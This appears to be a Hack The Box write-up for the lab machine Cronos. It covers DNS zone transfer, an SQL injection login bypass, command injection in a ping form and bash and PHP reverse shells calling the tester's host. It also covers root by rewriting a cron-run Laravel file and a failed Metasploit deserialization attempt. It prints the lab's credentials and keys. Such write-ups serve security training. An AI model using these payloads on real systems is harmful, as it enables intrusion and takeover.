

# HTB: Cronos

#htb-cronos #ctf #hackthebox #nmap #dns #nslookup #zone-transfer #dig
#gobuster #vhosts #vhosts #laravel #searchsploit #sqli #injection
#command-injection #burp #linpeas #cron #php #mysql #cve-2018-15133
#metasploit #oscp-like Apr 14, 2020






[HTB: Cronos](#)




![](/img/cronos-cover.png)

Cronos didn't provide anything too challenging, but did present a good
intro to many useful concepts. I'll enumerate DNS to get the admin
subdomain, and then bypass a login form using SQL injection to find
another form where I could use command injections to get code execution
and a shell. For privesc, I'll take advantage of a root cron job which
executes a file I have write privileges on, allowing me to modify it to
get a reverse shell. In Beyond Root, I'll look at the website and check
in on how I was able to do both the SQLi and the command injection, as
well as fail to exploit the machine with a Laravel PHP framework
deserialization bug, and determine why.

## Recon

### nmap

`nmap` shows three open ports, SSH (TCP 22), DNS (TCP/UDP 53) and HTTP
(TCP 80):



    root@kali# nmap -p- --min-rate 10000 -oA scans/alltcp 10.10.10.13
    Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-07 21:01 EDT
    Nmap scan report for 10.10.10.13
    Host is up (0.014s latency).
    Not shown: 65532 filtered ports
    PORT   STATE SERVICE
    22/tcp open  ssh
    53/tcp open  domain
    80/tcp open  http

    Nmap done: 1 IP address (1 host up) scanned in 13.47 seconds
    root@kali# nmap -sC -sV -p 22,53,80 -oA scans/tcpscripts 10.10.10.13
    Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-07 21:02 EDT
    Nmap scan report for 10.10.10.13
    Host is up (0.015s latency).

    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA)
    |   256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA)
    |_  256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (ED25519)
    53/tcp open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)
    | dns-nsid: 
    |_  bind.version: 9.10.3-P4-Ubuntu
    80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
    |_http-server-header: Apache/2.4.18 (Ubuntu)
    |_http-title: Apache2 Ubuntu Default Page: It works
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 14.92 seconds

    root@kali# nmap -sU -p- --min-rate 10000 -oA scans/alludp 10.10.10.13
    Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-07 21:02 EDT
    Nmap scan report for 10.10.10.13
    Host is up (0.014s latency).
    Not shown: 65532 open|filtered ports
    PORT   STATE  SERVICE
    22/udp closed ssh
    53/udp open   domain
    80/udp closed http

    Nmap done: 1 IP address (1 host up) scanned in 13.48 seconds



Based on the
[OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server)
and [Apache](https://packages.ubuntu.com/search?keywords=apache2)
versions, this looks like Ubuntu Xenial 16.04.

### DNS - TCP/UDP 50

For DNS enumeration, the first thing to do is try to resolve the IPs of
Cronos. I'll use `nslookup`, setting the server to Cronos, and then
looking up Cronos' IP:



    root@kali# nslookup 
    > server 10.10.10.13
    Default server: 10.10.10.13
    Address: 10.10.10.13#53
    > 10.10.10.13
    13.10.10.10.in-addr.arpa        name = ns1.cronos.htb.



Knowing the domain `ns1.cronos.htb` is useful, as it not only provides a
domain name to poke at, but also confirms the base domain `cronos.htb`.

Any time there's TCP DNS, it's worth trying a zone transfer, which
returns another two subdomains, `admin` and `www`:



    root@kali# dig axfr cronos.htb @10.10.10.13

    ; <<>> DiG 9.11.16-2-Debian <<>> axfr cronos.htb @10.10.10.13
    ;; global options: +cmd
    cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
    cronos.htb.             604800  IN      NS      ns1.cronos.htb.
    cronos.htb.             604800  IN      A       10.10.10.13
    admin.cronos.htb.       604800  IN      A       10.10.10.13
    ns1.cronos.htb.         604800  IN      A       10.10.10.13
    www.cronos.htb.         604800  IN      A       10.10.10.13
    cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
    ;; Query time: 14 msec
    ;; SERVER: 10.10.10.13#53(10.10.10.13)
    ;; WHEN: Tue Apr 07 21:08:57 EDT 2020
    ;; XFR size: 7 records (messages 1, bytes 203)



I'll add the following line to my `/etc/hosts` file:



    10.10.10.13 cronos.htb admin.cronos.htb ns1.cronos.htb www.cronos.htb



### Subdomain Brute Force

Since virtual hosts are involved here, I'll run a quick `gobuster`
subdomain brute force, but it only returns the known three:



    root@kali# gobuster dns -d cronos.htb -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt 
    ===============================================================
    Gobuster v3.0.1
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
    ===============================================================
    [+] Domain:     cronos.htb
    [+] Threads:    10
    [+] Timeout:    1s
    [+] Wordlist:   /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
    ===============================================================
    2020/04/08 06:32:15 Starting gobuster
    ===============================================================
    Found: ns1.cronos.htb
    Found: www.cronos.htb
    Found: admin.cronos.htb
    ===============================================================
    2020/04/08 06:34:22 Finished
    ===============================================================



### Website - TCP 80

By visiting the website by IP address, I just get the default Ubuntu
Apache 2 page:

![](/img/image-20200408063016169.png)

I ran a `gobuster` brute force, but didn't find anything.

`ns1.cronos.htb` returns the same thing.

### www.cronos.htb - TCP 80

#### Site

Both `cronos.htb` and `www.cronos.htb` lead to this page:

![](/img/image-20200408063701022.png)

Interestingly, all of the links go to external sites for Laravel, a "PHP
framework for web artisans" (whatever that means).

Again, `gobuster` here only returns `/css`, `/js`, and `index.php`.

#### Exploits

Looking in Burp at the HTTP responses, there is a `laravel_session`
cookie being set, so I can feel pretty confident that Cronos is using
Laravel.

`searchsploit` does show exploits against the Laravel framework:



    root@kali# searchsploit laravel
    ------------------------------------------------------------------------------------------------------------ ----------------------------------------
     Exploit Title                                                                                              |  Path
                                                                                                                | (/usr/share/exploitdb/)
    ------------------------------------------------------------------------------------------------------------ ----------------------------------------
    Laravel - 'Hash::make()' Password Truncation Security                                                       | exploits/multiple/remote/39318.txt
    Laravel Log Viewer < 0.13.0 - Local File Download                                                           | exploits/php/webapps/44343.py
    PHP Laravel Framework 5.5.40 / 5.6.x < 5.6.30 - token Unserialize Remote Command Execution (Metasploit)     | exploits/linux/remote/47129.rb
    UniSharp Laravel File Manager 2.0.0 - Arbitrary File Read                                                   | exploits/php/webapps/48166.txt
    UniSharp Laravel File Manager 2.0.0-alpha7 - Arbitrary File Upload                                          | exploits/php/webapps/46389.py
    ------------------------------------------------------------------------------------------------------------ ----------------------------------------
    Shellcodes: No Result



On doing some inspection of these scripts (`searchsploit -x [Path]`),
the first one is a way to trick the hash engine because of a truncation
issue, but I don't see any way to apply it here. The second, forth, and
fifth are not for this web framework.

The Metasploit script could have promise, but there are two issues:

-   I don't know the version of Laravel that's being run to know if it
    is vulnerable.
-   The exploit requires that I find a way to leak the `APP_KEY`. If I
    can find a way to leak that (perhaps an LFI), I'll come back to give
    this a try.

### admin.cronos.htb - TCP 80

The site just presents a login form and an advertisement (something I
hadn't seen in HTB before; it seems to be real).

![](/img/image-20200408071633234.png)

When I guess admin/admin, it returns an error about my username or
password, so no user enumeration here:

![](/img/image-20200408071715451.png)

## Shell as www-data

### SQLi Bypass Login

I tried a handful of SQL injection payloads. While `' or '1'='1` doesn't
work, `' or 1=1-- -` does. That means it's likely querying the database
with something like:



    SELECT * from users where user = '[username]' AND password = '[password]';



Then it must be checking later if rows returned. I'll show the code and
look into how the injection works in [Beyond Root](#web).

### Command Injection

#### Net Tool Enumeration

The payload allows me to bypass the login, which presents the next page,
Net Tool v0.1:

![](/img/image-20200408072657804.png)

The dropdown offers `traceroute` and `ping`. I can ping myself, and the
results are printed on the screen:

![](/img/image-20200408072928495.png)

#### Command Injection POC

Looking at the request that's submitted for that `ping`, it's very clear
there's a problem here:



    POST /welcome.php HTTP/1.1
    Host: admin.cronos.htb
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
    Accept: text.md,application/.md+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Referer: http://admin.cronos.htb/welcome.php
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 34
    Connection: close
    Cookie: PHPSESSID=fvt6rfuuoh069o763u89rhphr1
    Upgrade-Insecure-Requests: 1

    command=ping+-c+1&host=10.10.14.24



It seems that the webserver is likely taking the command and the host
and concatenating them together and then executing it. If that's true, I
can probably inject into either parameter. I'll send that request over
to repeater, and set the POST parameters to:



    command=ls -l&host=/var/www



The response includes:



    drwxr-xr-x  2 www-data www-data 4096 Jul 27  2017 admin<br>
    drwxr-xr-x  2 www-data www-data 4096 Jul 27  2017.md<br>
    drwxr-xr-x 13 www-data www-data 4096 Apr  9  2017 laravel<br>



### Shell

To turn that command injection into a shell, I'll just give it a reverse
shell payload:



    command=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.24/443+0>%261'%26host=



And catch a shell on a `nc` listener:



    root@kali# nc -lnvp 443
    Ncat: Version 7.80 ( https://nmap.org/ncat )
    Ncat: Listening on :::443
    Ncat: Listening on 0.0.0.0:443
    Ncat: Connection from 10.10.10.13.
    Ncat: Connection from 10.10.10.13:36196.
    bash: cannot set terminal process group (1388): Inappropriate ioctl for device
    bash: no job control in this shell
    www-data@cronos:/var/www/admin$



I'll do the shell upgrade:



    www-data@cronos:/var/www/admin$ python -c 'import pty;pty.spawn("bash")'
    python -c 'import pty;pty.spawn("bash")'
    www-data@cronos:/var/www/admin$ ^Z
    [1]+  Stopped                 nc -lnvp 443
    root@kali# stty raw -echo
    root@kali# nc -lnvp 443  # i entered fg
                                                           reset
    www-data@cronos:/var/www/admin$



And can grab `user.txt` from the only homedir:



    www-data@cronos:/home/noulis$ cat user.txt 
    51d23643************************



## Priv: www-data --\> root

### Enumeration

I'll go into my local
[linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
directory and start a Python3 webserver. Then I can grab it from Cronos:



    www-data@cronos:/dev/shm$ wget 10.10.14.24/linpeas.sh
    --2020-04-08 15:22:05--  http://10.10.14.24/linpeas.sh
    Connecting to 10.10.14.24:80... connected.
    HTTP request sent, awaiting response... 200 OK
    Length: 159864 (156K) [text/x-sh]                                         
    Saving to: 'linpeas.sh'

    linpeas.sh          100%[===================>] 156.12K  --.-KB/s    in 0.05s

    2020-04-08 15:22:05 (2.98 MB/s) - 'linpeas.sh' saved [159864/159864]  



Now run it, and in the Cron jobs section, the last line is red:



    www-data@cronos:/dev/shm$ bash linpeas.sh                                                                 ...[snip]...
    [+] Cron jobs
    [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#scheduled-jobs
    -rw-r--r-- 1 root root  797 Apr  9  2017 /etc/crontab 
    ...[snip]...
    * * * * *       root    php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1
    ...[snip]...



The cron syntax here says that it will run every minute, as root:

![](/img/crontab-syntax.png)

The command is
`php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1`

I don't really need to know what the Laravel artisan is doing. What does
matter is that as www-data, I have write permissions on that file:



    www-data@cronos:/var/www/laravel$ ls -la artisan 
    -rwxr-xr-x 1 www-data www-data 1646 Apr  9  2017 artisan



### Poison artisan

I'll open the `artisan` file and add two lines at the top:



    <?php

    $sock=fsockopen("10.10.14.24", 443);
    exec("/bin/sh -i <&3 >&3 2>&3");
    /*
    |--------------------------------------------------------------------------
    | Register The Auto Loader
    |--------------------------------------------------------------------------



Next time the cron runs, I get a callback:



    root@kali# nc -lnvp 443
    Ncat: Version 7.80 ( https://nmap.org/ncat )
    Ncat: Listening on :::443
    Ncat: Listening on 0.0.0.0:443
    Ncat: Connection from 10.10.10.13.
    Ncat: Connection from 10.10.10.13:36216.
    /bin/sh: 0: can't access tty; job control turned off
    # id
    uid=0(root) gid=0(root) groups=0(root)



After a shell upgrade, grab the final flag:



    root@cronos:~# cat root.txt 
    1703b8a3************************



## Beyond Root

### Web

Now that I can look back on the box, I wanted to see what was actually
happening in the web framework as I exploited it, for both the SQLi and
the command injection.

#### SQLi

`/var/www/admin/index.php` is the page that handles the POST requests to
login.



       if($_SERVER["REQUEST_METHOD"] == "POST") {
          // username and password sent from form 

          $myusername = $_POST['username'];
          $mypassword = md5($_POST['password']);
          
          $sql = "SELECT id FROM users WHERE username = '".$myusername."' and password = '".$mypassword."'";
          $result = mysqli_query($db,$sql);
          $row = mysqli_fetch_array($result,MYSQLI_ASSOC);                                                                                               
          //$active = $row['active'];
          $count = mysqli_num_rows($result);
                         
          // If result matched $myusername and $mypassword, table row must be 1 row
                                         
          if($count == 1) {
             //session_register("myusername");
             $_SESSION['login_user'] = $myusername;
                                                                                                                                                         
             header("location: welcome.php");                                                                                                            
          }else {
             $error = "Your Login Name or Password is invalid";               
          }    



The username and password are taken directly from the form and put into:



    SELECT id FROM users WHERE username = '$myusername' and password = '$mypassword'



So when I entered `' or '1'='1` as the username and admin as the
password, it results in:



    SELECT id FROM users WHERE username = '' or '1'='1' and password = 'admin'



Since `AND` has precedence over `OR`, this results in:



    SELECT id FROM users WHERE username = '' or ('1'='1' and password = 'admin')



This fails.

But later when I enter `' or 1=1-- -`, it becomes:



    SELECT id FROM users WHERE username = '' or 1=1-- -' and password = '$mypassword'



That will return all the users from the database.

Next the PHP checks that exactly one row was returned. If I log into the
database from Cronos, I can see that the DB only has one user in it.
First get the creds in `/var/www/admin/config.php`:



    <?php
       define('DB_SERVER', 'localhost');
       define('DB_USERNAME', 'admin');
       define('DB_PASSWORD', 'kEjdbRigfBHUREiNSDs');
       define('DB_DATABASE', 'admin');
       $db = mysqli_connect(DB_SERVER,DB_USERNAME,DB_PASSWORD,DB_DATABASE);
    ?>



Now I can connect and dump the users:



    root@cronos:/var/www/admin# mysql -u admin -pkEjdbRigfBHUREiNSDs admin 
    mysql: [Warning] Using a password on the command line interface can be insecure.
    Reading table information for completion of table and column names
    You can turn off this feature to get a quicker startup with -A

    Welcome to the MySQL monitor.  Commands end with ; or \g.
    Your MySQL connection id is 47
    Server version: 5.7.17-0ubuntu0.16.04.2 (Ubuntu)

    Copyright (c) 2000, 2016, Oracle and/or its affiliates. All rights reserved.

    Oracle is a registered trademark of Oracle Corporation and/or its
    affiliates. Other names may be trademarks of their respective
    owners.

    Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

    mysql> select * from users;
    +----+----------+----------------------------------+
    | id | username | password                         |
    +----+----------+----------------------------------+
    |  1 | admin    | 4f5fffa7b2340178a716e3832451e058 |
    +----+----------+----------------------------------+
    1 row in set (0.00 sec)



Had this been a real DB, that wouldn't have worked. Still, I could have
used a user `' or 1=1 LIMIT 1-- -`, and then it would have logged me in
as the first user, and I could have use `LIMIT X,1` to get the xth user
(0 based).

In general, when writing SQL-base auth in applications, it's best to get
the rows that match the username, and then compare the password hash
from that row to the hash of the input password. That will prevent the
password check's being commented out in an injection.

#### Command Injection

The command injection happens in `/var/www/admin/welcome.php`:



    <?php
       include('session.php');

    if($_SERVER["REQUEST_METHOD"] == "POST") {
            //print_r($_POST);
            $command = $_POST['command'];
            $host = $_POST['host'];
            exec($command.' '.$host, $output, $return);
            //print_r($output);
    }
    ?>



IT takes the two inputs, concatenates them together just as I observed,
and passes the string to `exec`. The output is stored in `$output`, and
printed to the page later.

### Laravel and CVE-2018-15133

The only Laravel CVE that seemed useful here was
[CVE-2018-15133](https://github.com/kozmic/laravel-poc-CVE-2018-15133),
which was a PHP deserialization bug. There is also a Metasploit exploit
for this vulnerability, `unix/http/laravel_token_unserialize_exec`. This
bug was released well after Cronos was retired let alone created, so
it's clearly not an intended path. Still, I wanted to play with it.

In order to pull this off, I needed the `APP_KEY`. I didn't find a way
to leak this during the box, but as root (or even www-data), I can grab
it. It is stored in the `.env` file in the `/var/www/laravel` directory.



    root@cronos:/var/www/laravel# cat .env | grep APP_KEY
    APP_KEY=base64:+fUFGL45d1YZYlSTc0Sm71wPzJejQN/K6s9bHHihdYE=
    PUSHER_APP_KEY=



Using the Metasploit exploit, I set the key and the other options:



    msf5 exploit(unix/http/laravel_token_unserialize_exec) > options

    Module options (exploit/unix/http/laravel_token_unserialize_exec):

       Name       Current Setting                               Required  Description
       ----       ---------------                               --------  -----------
       APP_KEY    +fUFGL45d1YZYlSTc0Sm71wPzJejQN/K6s9bHHihdYE=  no        The base64 encoded APP_KEY string from the .env file
       Proxies                                                  no        A proxy chain of format type:host:port[,type:host:port][...]
       RHOSTS     10.10.10.13                                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
       RPORT      80                                            yes       The target port (TCP)
       SSL        false                                         no        Negotiate SSL/TLS for outgoing connections
       TARGETURI  /                                             yes       Path to target webapp
       VHOST      www.cronos.htb                                no        HTTP server virtual host


    Payload options (cmd/unix/reverse_bash):

       Name   Current Setting  Required  Description
       ----   ---------------  --------  -----------
       LHOST  10.10.14.24      yes       The listen address (an interface may be specified)
       LPORT  443              yes       The listen port


    Exploit target:

       Id  Name
       --  ----
       0   Automatic



It's important to set the `VHOST` option, or the payloads will submit to
the wrong vhost.

When I run this, it says it runs, but no shell:



    msf5 exploit(unix/http/laravel_token_unserialize_exec) > run

    [*] Started reverse TCP handler on 10.10.14.24:443 
    [*] Exploit completed, but no session was created.



I added a proxy (I'll also need to set `ReverseAllowProxy`):



    msf5 exploit(unix/http/laravel_token_unserialize_exec) > set proxies http:127.0.0.1:8080
    proxies => http:127.0.0.1:8080
    msf5 exploit(unix/http/laravel_token_unserialize_exec) > set ReverseAllowProxy true
    ReverseAllowProxy => true



On re-running it, I see that it's sending a four HTTP POST requests,
each of which is getting a 405 Method Not Allowed response:

![](/img/image-20200408133125659.png)

I tried intercepting these requests, and changing each to a GET. The
responses were now 200, but no code execution. It turns out that the
exploit only works on a POST request (since the deserialization is in
the XSRF token, this makes sense).

I looked a bit more in-depth at the Laravel app, to see if I could find
a POST endpoint. The routes are defined in
`/var/www/laravel/routes/web.php`:



    <?php

    /*
    |--------------------------------------------------------------------------
    | Web Routes
    |--------------------------------------------------------------------------
    |
    | Here is where you can register web routes for your application. These
    | routes are loaded by the RouteServiceProvider within a group which
    | contains the "web" middleware group. Now create something great!
    |
    */

    Route::get('/', function () {
        return view('welcome');
    });



The only route is `/`, and it only takes GET. That's the end of this
exploit for Cronos as far as I can tell.





